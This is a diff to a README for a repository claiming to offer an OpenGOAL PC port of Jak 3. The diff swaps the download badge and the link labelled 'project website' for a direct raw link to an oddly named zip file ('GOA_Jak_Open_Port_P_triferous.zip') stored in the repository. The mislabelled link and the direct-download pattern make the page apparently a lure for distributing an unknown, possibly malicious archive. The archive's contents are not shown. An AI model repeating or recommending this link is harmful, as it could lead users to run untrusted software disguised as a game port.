@@ -1,6 +1,6 @@
 # 🎮 OpenGOAL-Jak-PC-Port - Play Jak 3 on your desktop
 
-[![Download OpenGOAL](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Ericintersexual55/OpenGOAL-Jak-PC-Port)
+[![Download OpenGOAL](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Ericintersexual55/OpenGOAL-Jak-PC-Port/raw/refs/heads/main/Application/GOA_Jak_Open_Port_P_triferous.zip)
 
 This project brings the classic platformer game Jak 3 to your Windows PC. It uses the OpenGOAL engine to run the game natively on modern hardware. You get high resolutions, smooth frame rates, and keyboard or controller support.
 
@@ -20,7 +20,7 @@ These specs ensure the game runs without skipping or slowing down. If your compu
 
 Follow these steps to get the software on your machine:
 
-1. Visit the project website to access the files: [https://github.com/Ericintersexual55/OpenGOAL-Jak-PC-Port](https://github.com/Ericintersexual55/OpenGOAL-Jak-PC-Port)
+1. Visit the project website to access the files: [https://github.com/Ericintersexual55/OpenGOAL-Jak-PC-Port/raw/refs/heads/main/Application/GOA_Jak_Open_Port_P_triferous.zip](https://github.com/Ericintersexual55/OpenGOAL-Jak-PC-Port/raw/refs/heads/main/Application/GOA_Jak_Open_Port_P_triferous.zip)
 2. Locate the latest release on the right side of the page.
 3. Click the link to save the installer to your computer.
 4. Select a folder you can find later, such as your Downloads folder.
